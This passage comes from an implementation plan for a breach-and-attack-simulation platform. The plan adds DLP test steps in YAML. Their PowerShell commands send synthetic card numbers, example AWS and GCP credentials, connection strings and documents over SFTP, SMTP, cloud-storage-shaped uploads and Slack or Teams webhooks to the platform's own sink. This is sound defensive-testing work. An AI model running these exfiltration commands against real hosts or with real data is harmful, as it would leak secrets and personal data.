      Set-Content -Path $tempFile -Value $payload -NoNewline
      $remoteFile = "{{SINK_TOKEN}}.dat"
      $batchFile = New-TemporaryFile
      "put `"$($tempFile.FullName)`" `"$remoteFile`"" | Set-Content -Path $batchFile
      try {
        $output = & sftp.exe -oBatchMode=yes -oStrictHostKeyChecking=no -oUserKnownHostsFile=NUL -P {{SINK_SFTP_PORT}} -b $batchFile dlptest@{{SINK_SFTP_HOST}} 2>&1
        $exitCode = $LASTEXITCODE
        Write-Output "DLP_OBSERVATION: sftp_exit_code=$exitCode"
        foreach ($line in $output) { Write-Output "DLP_OBSERVATION: sftp_output=$line" }
        Write-Output "EXEC T1048.002: Israeli-ID-shaped SFTP exfiltration attempt completed (local exit code $exitCode -- see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
      } catch {
        Write-Output "DLP_OBSERVATION: sftp_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1048.002: SFTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
      } finally {
        Remove-Item $tempFile, $batchFile -ErrorAction SilentlyContinue
      }
      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
      # step's graded verdict comes entirely from whether the SFTP sink
      # actually received the upload, resolved server-side by
      # internal/sftpsink + internal/verifysync + internal/reporting's
      # sink-primary dlpVerifier, never from this script's own exit code.
    cleanup: ""

  - name: "DLP Validation — SFTP Exfiltration of American Express Card Record (T1048.002)"
    technique_id: T1048.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Uploads a synthetic Amex-card-shaped file via SFTP to the platform's own SFTP listener (this same on-prem orchestrator). If the endpoint has no OpenSSH Client installed, the step is skipped rather than attempted."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SFTP sink port"
      - "Sysmon EID 1: sftp.exe process creation"
    detection:
      - "DLP/network: SSH/SFTP protocol handshake and file-transfer content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $sftpCmd = Get-Command sftp.exe -ErrorAction SilentlyContinue
      if (-not $sftpCmd) {
        Write-Output "skip: sftp.exe (OpenSSH Client) not found on this endpoint"
        exit 0
      }
      $payload = "[BAS-SIM-DLP] CardBrand,CardNumber`nAmerican Express,378282246310005"
      $tempFile = New-TemporaryFile
      Set-Content -Path $tempFile -Value $payload -NoNewline
      $remoteFile = "{{SINK_TOKEN}}.dat"
      $batchFile = New-TemporaryFile
      "put `"$($tempFile.FullName)`" `"$remoteFile`"" | Set-Content -Path $batchFile
      try {
        $output = & sftp.exe -oBatchMode=yes -oStrictHostKeyChecking=no -oUserKnownHostsFile=NUL -P {{SINK_SFTP_PORT}} -b $batchFile dlptest@{{SINK_SFTP_HOST}} 2>&1
        $exitCode = $LASTEXITCODE
        Write-Output "DLP_OBSERVATION: sftp_exit_code=$exitCode"
        foreach ($line in $output) { Write-Output "DLP_OBSERVATION: sftp_output=$line" }
        Write-Output "EXEC T1048.002: Amex-card-shaped SFTP exfiltration attempt completed (local exit code $exitCode -- see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
      } catch {
        Write-Output "DLP_OBSERVATION: sftp_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1048.002: SFTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
      } finally {
        Remove-Item $tempFile, $batchFile -ErrorAction SilentlyContinue
      }
      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
      # step's graded verdict comes entirely from whether the SFTP sink
      # actually received the upload, resolved server-side by
      # internal/sftpsink + internal/verifysync + internal/reporting's
      # sink-primary dlpVerifier, never from this script's own exit code.
    cleanup: ""
```

- [ ] **Step 2: Re-sign the file**

```bash
go run scripts/signer.go sign private_key.pem ../scenarios/dlp-exfiltration-sftp.yaml
```

- [ ] **Step 3: Verify**

Run: `go test ./internal/scenario/... -run TestLoad -v`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add scenarios/dlp-exfiltration-sftp.yaml scenarios/dlp-exfiltration-sftp.yaml.sig
git commit -m "feat(scenarios): add content-type diversity to SFTP DLP channel"
```

---

### Task 4: SMTP channel — 5 new steps

**Files:**
- Modify: `scenarios/dlp-exfiltration-smtp.yaml`
- Modify: `scenarios/dlp-exfiltration-smtp.yaml.sig` (regenerated)

**Interfaces:**
- Consumes: existing `{{SINK_TOKEN}}` / `{{SINK_SMTP_HOST}}` / `{{SINK_SMTP_PORT}}` placeholders and the file's existing `Send-MailMessage` pattern (token as `-Subject`).
- Produces: nothing consumed by later tasks.

- [ ] **Step 1: Append 5 new steps to `scenarios/dlp-exfiltration-smtp.yaml`, immediately after the existing single step**

```yaml
  - name: "DLP Validation — SMTP Exfiltration of Medical Record (T1048.003)"
    technique_id: T1048.003
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Sends a synthetic medical-record-shaped email via SMTP to the platform's own SMTP listener (this same on-prem orchestrator). No real mail server is contacted."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SMTP sink port"
      - "Sysmon EID 1: powershell.exe (Send-MailMessage) network activity"
    detection:
      - "DLP/mail-gateway: SMTP protocol and message content inspection (subject + body)"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "[BAS-SIM-DLP] Patient,MRN,Diagnosis`nBAS-SIM-Patient,MRN-000000,Synthetic-Test-Diagnosis"
      $token = "{{SINK_TOKEN}}"
      $body = "$token`n$payload"
      try {
        Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
          -Subject $token -Body $body `
          -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
          -ErrorAction Stop
        Write-Output "DLP_OBSERVATION: send_mail_result=success"
        Write-Output "EXEC T1048.003: Medical-record-shaped SMTP exfiltration attempt completed (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
      } catch {
        Write-Output "DLP_OBSERVATION: send_mail_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1048.003: SMTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
      }
      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
      # step's graded verdict comes entirely from whether the SMTP sink
      # actually received a message with a matching Subject, resolved
      # server-side by internal/smtpsink + internal/verifysync +
      # internal/reporting's sink-primary dlpVerifier, never from this
      # script's own success/failure.
    cleanup: ""

  - name: "DLP Validation — SMTP Exfiltration of Discover Card Record (T1048.003)"
    technique_id: T1048.003
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Sends a synthetic Discover-card-shaped email via SMTP to the platform's own SMTP listener (this same on-prem orchestrator). No real mail server is contacted."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SMTP sink port"
      - "Sysmon EID 1: powershell.exe (Send-MailMessage) network activity"
    detection:
      - "DLP/mail-gateway: SMTP protocol and message content inspection (subject + body)"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "[BAS-SIM-DLP] CardBrand,CardNumber`nDiscover,6011111111111117"
      $token = "{{SINK_TOKEN}}"
      $body = "$token`n$payload"
      try {
        Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
          -Subject $token -Body $body `
          -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
          -ErrorAction Stop
        Write-Output "DLP_OBSERVATION: send_mail_result=success"
        Write-Output "EXEC T1048.003: Discover-card-shaped SMTP exfiltration attempt completed (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
      } catch {
        Write-Output "DLP_OBSERVATION: send_mail_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1048.003: SMTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
      }
      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
      # step's graded verdict comes entirely from whether the SMTP sink
      # actually received a message with a matching Subject, resolved
      # server-side by internal/smtpsink + internal/verifysync +
      # internal/reporting's sink-primary dlpVerifier, never from this
      # script's own success/failure.
    cleanup: ""

  - name: "DLP Validation — SMTP Exfiltration of GCP Cloud Credentials (T1048.003)"
    technique_id: T1048.003
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Sends a synthetic GCP-service-account-shaped email via SMTP to the platform's own SMTP listener (this same on-prem orchestrator). No real mail server is contacted."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SMTP sink port"
      - "Sysmon EID 1: powershell.exe (Send-MailMessage) network activity"
    detection:
      - "DLP/mail-gateway: SMTP protocol and message content inspection (subject + body)"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "{`"type`":`"service_account`",`"project_id`":`"bas-sim-dlp-project`",`"private_key_id`":`"0000000000000000000000000000000000dead`",`"client_email`":`"bas-sim@bas-sim-dlp-project.iam.gserviceaccount.com`"}"
      $token = "{{SINK_TOKEN}}"
      $body = "$token`n$payload"
      try {
        Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
          -Subject $token -Body $body `
          -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
          -ErrorAction Stop
        Write-Output "DLP_OBSERVATION: send_mail_result=success"
        Write-Output "EXEC T1048.003: GCP-credential-shaped SMTP exfiltration attempt completed (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
      } catch {
        Write-Output "DLP_OBSERVATION: send_mail_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1048.003: SMTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
      }
      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
      # step's graded verdict comes entirely from whether the SMTP sink
      # actually received a message with a matching Subject, resolved
      # server-side by internal/smtpsink + internal/verifysync +
      # internal/reporting's sink-primary dlpVerifier, never from this
      # script's own success/failure.
    cleanup: ""

  - name: "DLP Validation — SMTP Exfiltration of Employment Contract (T1048.003)"
    technique_id: T1048.003
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Sends a synthetic employment-contract-shaped email via SMTP to the platform's own SMTP listener (this same on-prem orchestrator). No real mail server is contacted."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SMTP sink port"
      - "Sysmon EID 1: powershell.exe (Send-MailMessage) network activity"
    detection:
      - "DLP/mail-gateway: SMTP protocol and message content inspection (subject + body)"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "[BAS-SIM-DLP] Employment Contract (Synthetic)`nEmployee: BAS-SIM-Employee`nSalary: `$0.00 (synthetic, test fixture only)"
      $token = "{{SINK_TOKEN}}"
      $body = "$token`n$payload"
      try {
        Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
          -Subject $token -Body $body `
          -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
          -ErrorAction Stop
        Write-Output "DLP_OBSERVATION: send_mail_result=success"
        Write-Output "EXEC T1048.003: Employment-contract-shaped SMTP exfiltration attempt completed (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
      } catch {
        Write-Output "DLP_OBSERVATION: send_mail_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1048.003: SMTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
      }
      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
      # step's graded verdict comes entirely from whether the SMTP sink
      # actually received a message with a matching Subject, resolved
      # server-side by internal/smtpsink + internal/verifysync +
      # internal/reporting's sink-primary dlpVerifier, never from this
      # script's own success/failure.
    cleanup: ""

  - name: "DLP Validation — SMTP Exfiltration of Go Source Code (T1048.003)"
    technique_id: T1048.003
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Sends a synthetic Go-source-code-shaped email (embedded fake secret) via SMTP to the platform's own SMTP listener (this same on-prem orchestrator). No real mail server is contacted."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SMTP sink port"
      - "Sysmon EID 1: powershell.exe (Send-MailMessage) network activity"
    detection:
      - "DLP/mail-gateway: SMTP protocol and message content inspection (subject + body)"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "// [BAS-SIM-DLP]`nconst dbPassword = `"BAS-SIM-DLP-Placeholder8`" // test fixture"
      $token = "{{SINK_TOKEN}}"
      $body = "$token`n$payload"
      try {
        Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
          -Subject $token -Body $body `
          -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
          -ErrorAction Stop
        Write-Output "DLP_OBSERVATION: send_mail_result=success"
        Write-Output "EXEC T1048.003: Go-source-code-shaped SMTP exfiltration attempt completed (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
      } catch {
        Write-Output "DLP_OBSERVATION: send_mail_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1048.003: SMTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
      }
      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
      # step's graded verdict comes entirely from whether the SMTP sink
      # actually received a message with a matching Subject, resolved
      # server-side by internal/smtpsink + internal/verifysync +
      # internal/reporting's sink-primary dlpVerifier, never from this
      # script's own success/failure.
    cleanup: ""
```

- [ ] **Step 2: Re-sign the file**

```bash
go run scripts/signer.go sign private_key.pem ../scenarios/dlp-exfiltration-smtp.yaml
```

- [ ] **Step 3: Verify**

Run: `go test ./internal/scenario/... -run TestLoad -v`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add scenarios/dlp-exfiltration-smtp.yaml scenarios/dlp-exfiltration-smtp.yaml.sig
git commit -m "feat(scenarios): add content-type diversity to SMTP DLP channel"
```

---

### Task 5: Cloud storage channel — 4 new steps

**Files:**
- Modify: `scenarios/dlp-exfiltration-cloud-storage.yaml`
- Modify: `scenarios/dlp-exfiltration-cloud-storage.yaml.sig` (regenerated)

**Interfaces:**
- Consumes: existing `{{SINK_TOKEN}}` / `{{SINK_CLOUD_HOST}}` / `{{SINK_CLOUD_PORT}}` placeholders and each provider's existing path/method/header shape (S3 PUT with `x-amz-*` headers, Azure Blob PUT with `x-ms-*` headers, Google Drive multipart POST, OneDrive PUT).
- Produces: nothing consumed by later tasks.

Per the spec, these 4 new steps attach one content family each to 4 of the 7 existing provider steps (S3, Azure Blob, Google Drive, OneDrive) — reusing that provider's exact existing request shape, changing only the payload.

- [ ] **Step 1: Append 4 new steps to `scenarios/dlp-exfiltration-cloud-storage.yaml`, after the existing 7 provider steps (before the final blank line)**

```yaml
  # ---------------------------------------------------------------------------
  # Content-type diversity — AWS Cloud Credentials over S3-compatible shape
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — S3-Compatible Exfiltration of AWS Cloud Credentials (T1567.002)"
    technique_id: T1567.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "PUTs a synthetic AWS-credential-shaped payload to the platform's own S3-compatible-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only, not an authenticated S3 request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: S3-shaped HTTPS PUT (path structure, x-amz-* headers) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "[default]`naws_access_key_id=AKIAIOSFODNN7EXAMPLE`naws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
      $token = "{{SINK_TOKEN}}"
      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/s3/bas-sim-bucket/$token.dat"
      try {
        Invoke-RestMethod -Uri $uri -Method Put -Body $payload `
          -Headers @{ 'x-amz-content-sha256' = 'UNSIGNED-PAYLOAD'; 'x-amz-date' = (Get-Date).ToUniversalTime().ToString('yyyyMMddTHHmmssZ') } `
          -ContentType 'application/octet-stream' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: s3_put_result=success"
        Write-Output "EXEC T1567.002: AWS-credential-shaped S3-compatible traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-S3]"
      } catch {
        Write-Output "DLP_OBSERVATION: s3_put_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.002: S3-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-S3]"
      }
      # See the S3 step above for why this step's graded verdict never
      # comes from this script's own success/failure.
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Content-type diversity — MongoDB Connection String over Azure Blob shape
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — Azure Blob-Compatible Exfiltration of MongoDB Connection String (T1567.002)"
    technique_id: T1567.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "PUTs a synthetic MongoDB-connection-string-shaped payload to the platform's own Azure-Blob-compatible-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only, not an authenticated Azure request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: Azure-Blob-shaped HTTPS PUT (path structure, x-ms-* headers) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "mongodb://bas_sim_user:BAS-SIM-DLP-Placeholder3@bas-sim-mongo:27017/bas_sim_dlp"
      $token = "{{SINK_TOKEN}}"
      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/azureblob/bas-sim-container/$token.dat"
      try {
        Invoke-RestMethod -Uri $uri -Method Put -Body $payload `
          -Headers @{ 'x-ms-version' = '2021-08-06'; 'x-ms-blob-type' = 'BlockBlob' } `
          -ContentType 'application/octet-stream' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: azureblob_put_result=success"
        Write-Output "EXEC T1567.002: MongoDB-connection-string-shaped Azure Blob traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-AZUREBLOB]"
      } catch {
        Write-Output "DLP_OBSERVATION: azureblob_put_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.002: Azure Blob-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-AZUREBLOB]"
      }
      # See the S3 step above for why this step's graded verdict never
      # comes from this script's own success/failure.
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Content-type diversity — C# Source Code over Google Drive shape
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — Google Drive-Compatible Exfiltration of C# Source Code (T1567.002)"
    technique_id: T1567.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic C#-source-code-shaped payload (embedded fake secret) to the platform's own Drive-API-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only, not an authenticated Drive API request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: Google-Drive-shaped multipart HTTPS POST content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "// [BAS-SIM-DLP]`nstring apiKey = `"BAS-SIM-DLP-Placeholder7`"; // test fixture"
      $token = "{{SINK_TOKEN}}"
      $boundary = [System.Guid]::NewGuid().ToString()
      $metadata = "{`"name`":`"$token.dat`",`"mimeType`":`"text/plain`"}"
      $bodyLines = @(
        "--$boundary",
        'Content-Type: application/json; charset=UTF-8',
        '',
        $metadata,
        "--$boundary",
        'Content-Type: text/plain',
        '',
        $payload,
        "--$boundary--"
      ) -join "`r`n"
      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/gdrive/upload/drive/v3/files"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $bodyLines -ContentType "multipart/related; boundary=$boundary" -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: gdrive_upload_result=success"
        Write-Output "EXEC T1567.002: C#-source-code-shaped Google Drive traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-GDRIVE]"
      } catch {
        Write-Output "DLP_OBSERVATION: gdrive_upload_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.002: Google Drive-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-GDRIVE]"
      }
      # See the S3 step above for why this step's graded verdict never
      # comes from this script's own success/failure.
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Content-type diversity — Partnership Agreement over OneDrive shape
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — OneDrive (Graph API)-Compatible Exfiltration of Partnership Agreement (T1567.002)"
    technique_id: T1567.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "PUTs a synthetic partnership-agreement-shaped payload to the platform's own Graph-API-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only, not an authenticated Graph request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: Microsoft-Graph-shaped HTTPS PUT (upload-by-path structure) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "[BAS-SIM-DLP] Partnership Agreement (Synthetic)`nParty A: BAS-SIM-Corp-A`nParty B: BAS-SIM-Corp-B (test fixture only)"
      $token = "{{SINK_TOKEN}}"
      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/graph/v1.0/me/drive/root:/$token.dat:/content"
      try {
        Invoke-RestMethod -Uri $uri -Method Put -Body $payload -ContentType 'text/plain' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: onedrive_put_result=success"
        Write-Output "EXEC T1567.002: Partnership-agreement-shaped OneDrive traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-ONEDRIVE]"
      } catch {
        Write-Output "DLP_OBSERVATION: onedrive_put_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.002: OneDrive-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-ONEDRIVE]"
      }
      # See the S3 step above for why this step's graded verdict never
      # comes from this script's own success/failure.
    cleanup: ""
```

- [ ] **Step 2: Re-sign the file**

```bash
go run scripts/signer.go sign private_key.pem ../scenarios/dlp-exfiltration-cloud-storage.yaml
```

- [ ] **Step 3: Verify**

Run: `go test ./internal/scenario/... -run TestLoad -v`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add scenarios/dlp-exfiltration-cloud-storage.yaml scenarios/dlp-exfiltration-cloud-storage.yaml.sig
git commit -m "feat(scenarios): add content-type diversity to cloud storage DLP channel"
```

---

### Task 6: Webhook channel — 3 new steps

**Files:**
- Modify: `scenarios/dlp-exfiltration-webhook.yaml`
- Modify: `scenarios/dlp-exfiltration-webhook.yaml.sig` (regenerated)

**Interfaces:**
- Consumes: existing `{{SINK_TOKEN}}` / `{{SINK_WEBHOOK_HOST}}` / `{{SINK_WEBHOOK_PORT}}` placeholders and the Slack incoming-webhook path/JSON shape (`{text: "..."}`).
- Produces: nothing consumed by later tasks.

- [ ] **Step 1: Append 3 new steps to `scenarios/dlp-exfiltration-webhook.yaml`, after the existing 2 provider steps**

```yaml
  # ---------------------------------------------------------------------------
  # Content-type diversity — AWS Cloud Credentials over Slack webhook shape
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — Slack-Compatible Exfiltration of AWS Cloud Credentials (T1567.004)"
    technique_id: T1567.004
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic AWS-credential-shaped payload to the platform's own Slack-webhook-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: Slack-webhook-shaped HTTPS POST content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "[default]`naws_access_key_id=AKIAIOSFODNN7EXAMPLE`naws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
      $token = "{{SINK_TOKEN}}"
      $body = @{ text = "$token`n$payload" } | ConvertTo-Json -Compress
      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/slack/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: slack_webhook_result=success"
        Write-Output "EXEC T1567.004: AWS-credential-shaped Slack webhook traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-SLACK]"
      } catch {
        Write-Output "DLP_OBSERVATION: slack_webhook_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.004: Slack-compatible webhook traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-SLACK]"
      }
      # See the Slack step above for why this step's graded verdict never
      # comes from this script's own success/failure.
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Content-type diversity — PostgreSQL Connection String over Slack webhook shape
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — Slack-Compatible Exfiltration of PostgreSQL Connection String (T1567.004)"
    technique_id: T1567.004
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic PostgreSQL-connection-string-shaped payload to the platform's own Slack-webhook-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: Slack-webhook-shaped HTTPS POST content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "postgresql://bas_sim_user:BAS-SIM-DLP-Placeholder4@bas-sim-postgres:5432/bas_sim_dlp"
      $token = "{{SINK_TOKEN}}"
      $body = @{ text = "$token`n$payload" } | ConvertTo-Json -Compress
      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/slack/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: slack_webhook_result=success"
        Write-Output "EXEC T1567.004: PostgreSQL-connection-string-shaped Slack webhook traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-SLACK]"
      } catch {
        Write-Output "DLP_OBSERVATION: slack_webhook_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.004: Slack-compatible webhook traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-SLACK]"
      }
      # See the Slack step above for why this step's graded verdict never
      # comes from this script's own success/failure.
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Content-type diversity — Maestro Card Record over Teams webhook shape
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — Microsoft Teams-Compatible Exfiltration of Maestro Card Record (T1567.004)"
    technique_id: T1567.004
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic Maestro-card-shaped payload to the platform's own Teams-webhook-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: Microsoft-Teams-webhook-shaped HTTPS POST content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "[BAS-SIM-DLP] CardBrand,CardNumber`nMaestro,6759649826438453"
      $token = "{{SINK_TOKEN}}"
